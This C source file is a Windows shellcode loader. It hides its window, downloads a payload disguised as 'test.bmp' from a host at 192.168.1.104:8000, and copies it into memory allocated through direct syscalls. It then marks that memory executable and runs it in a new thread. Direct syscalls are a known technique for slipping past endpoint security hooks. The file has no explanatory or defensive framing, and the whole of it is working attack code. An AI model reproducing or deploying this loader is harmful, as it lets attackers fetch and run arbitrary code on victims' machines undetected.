#define _CRT_SECURE_NO_WARNINGS
// #include <iostream>
#include <Windows.h>
#include <winhttp.h>
#include "syscalls.h"

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = (char*)(dest);
	char* s = (char*)(src);
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}

int main() {
	ShowWindow(GetForegroundWindow(), 0);
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	// Use WinHttpOpen to obtain a session handle.
	hSession = WinHttpOpen(L"WinHTTP Example/1.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	// Specify an HTTP server.
	if (hSession)
		hConnect = WinHttpConnect(hSession, L"192.168.1.104",
			8000, 0);

	// Create an HTTP request handle.
	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, L"GET", L"test.bmp",
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			0);

	// Send a request.
	if (hRequest)
		bResults = WinHttpSendRequest(hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS,
			0, WINHTTP_NO_REQUEST_DATA, 0,
			0, 0);

	// End the request.
	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);

	PVOID lpAddress = NULL;
	SIZE_T sDataSize = 0x40000;
	NtAllocateVirtualMemory((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);
	DWORD_PTR hptr = (DWORD_PTR)lpAddress;

	if (bResults)
		do
		{
			dwSize = 0;
			WinHttpQueryDataAvailable(hRequest, &dwSize);
			pszOutBuffer = (unsigned char*)calloc(dwSize+1, sizeof(unsigned char));
			ZeroMemory(pszOutBuffer, dwSize + 1);
			WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,dwSize, &dwDownloaded);
	        	// char key[] = { 0x12, 0x34, 0x56, 0x78, 0x90, 0x12, 0x34, 0x56, 0x78, 0x90 };
            		// for (int i = 0; i < dwSize; ++i){
			// 	pszOutBuffer[i] ^= key[i % sizeof(key)];
			// }
			VxMoveMemory((PVOID)hptr, pszOutBuffer, dwSize);
			hptr += dwSize;
			free(pszOutBuffer);
		} while (dwSize > 0);
	ULONG ulOldProtect = 0;
	NtProtectVirtualMemory((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);
	HANDLE hHostThread = INVALID_HANDLE_VALUE;
	NtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
	NtWaitForMultipleObjects(1, &hHostThread, WaitAll, FALSE, NULL);

	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
	return 0;
}
